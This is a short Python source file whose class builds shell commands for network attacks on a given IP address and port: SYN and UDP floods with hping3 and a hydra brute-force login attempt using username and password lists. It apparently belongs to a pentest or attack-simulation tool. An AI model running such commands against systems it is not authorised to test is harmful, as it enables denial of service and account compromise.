from typing import Literal, Optional
from constants import services_on_ports_for_brute_force


class ShellCommandTranslator:
    def to_shell_command_attack(
            self,
            ip_address: str,
            port_id: str,
            service: str,
            type_attack: Literal["syn_flood", "udp_flood", "brute_force"],
    ) -> Optional[str]:
        type_to_func_mapping = {
            "syn_flood": self.__to_shell_syn_flood_attack,
            "udp_flood": self.__to_shell_udp_flood_attack,
            "brute_force": self.__to_shell_brute_force_attack
        }
        return type_to_func_mapping[type_attack](ip_address, port_id, count_packets=5, service=service)

    def __to_shell_syn_flood_attack(
            self,
            ip_address: str,
            port_id: str,
            count_packets: int,
            service: str
    ) -> str:
        attack_command = \
            f"hping3 " \
            f"-S " \
            f"{ip_address}" \
            f" -p {port_id}" \
            f" -c {count_packets}"
        return attack_command

    def __to_shell_udp_flood_attack(
            self,
            ip_address: str,
            port_id: str,
            count_packets: int,
            service: str
    ) -> str:
        attack_command = \
            f"hping3 " \
            f"--udp " \
            f"{ip_address}" \
            f" -p {port_id}" \
            f" -c {count_packets}"
        return attack_command

    def __to_shell_brute_force_attack(
            self,
            ip_address: str,
            port_id: str,
            count_packets: int,
            service: str
    ) -> str:
        attack_command = f"hydra -V -f " \
                         f"-L list_usernames.txt -P list_passwd.txt" \
                         f" {services_on_ports_for_brute_force[service]}://{ip_address}"

        return attack_command
